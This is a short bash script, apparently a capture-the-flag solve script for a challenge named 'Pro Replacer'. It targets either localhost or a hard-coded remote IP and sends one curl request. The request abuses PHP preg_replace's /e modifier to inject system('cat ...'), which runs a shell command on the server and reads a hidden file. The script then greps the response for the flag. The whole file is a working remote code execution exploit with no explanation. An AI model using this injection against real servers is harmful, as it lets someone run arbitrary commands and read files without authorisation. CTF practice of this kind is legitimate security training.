#!/bin/bash

PORT=8001

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.105:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi

# Pro Replacer

curl "$URL"'/?needle=m%2Fe&replacement=system%28%27cat+wRtu3ND38n8RNgez%27%29&haystack=m&submit=Replace' -s | grep SSS | xargs
